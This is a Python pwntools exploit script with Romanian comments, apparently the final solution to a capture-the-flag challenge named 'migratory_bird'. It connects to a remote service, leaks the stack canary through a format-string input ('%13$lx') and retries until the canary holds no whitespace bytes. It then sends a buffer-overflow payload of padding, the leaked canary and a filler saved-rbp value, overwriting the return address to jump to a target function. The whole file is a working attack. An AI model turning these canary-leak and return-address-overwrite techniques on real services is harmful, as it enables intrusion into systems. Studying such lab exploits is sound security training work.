--- Cod final (migratory_bird_x64_exploit_detaliat.py) ---
from pwn import *

context.log_level = 'error'

HOST = "10.213.0.102"
PORT = 32642   # actualizeaza portul la tine

SOUTH_AFRICA = 0x40127b   # adresa functiei south_africa()
OFFSET = 40               # pana la canary (vezi explicatia din mesajul anterior)

WHITESPACE = {0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20}


def incearca():
    p = remote(HOST, PORT, timeout=5)

    p.recvuntil(b"name: ")
    p.sendline(b"%13$lx")
    raspuns = p.recvline(timeout=3).decode(errors="replace").strip()
    canary = int(raspuns, 16)
    canary_bytes = p64(canary)

    if any(b in WHITESPACE for b in canary_bytes[1:]):
        log.info(f"Canary {hex(canary)} contine un octet whitespace -- reincerc cu conexiune noua")
        p.close()
        return None

    log.info(f"Canary curat gasit: {hex(canary)}")

    payload = b"A" * OFFSET
    payload += canary_bytes
    payload += b"B" * 8              # saved rbp, nu conteaza valoarea
    payload += p64(SOUTH_AFRICA)     # adresa de return suprascrisa

    p.recvuntil(b"joke: ")
    p.sendline(payload)

    raspuns_final = p.recvall(timeout=3)
    return raspuns_final


rezultat = None
while rezultat is None:
    rezultat = incearca()

print(rezultat.decode(errors="replace"))

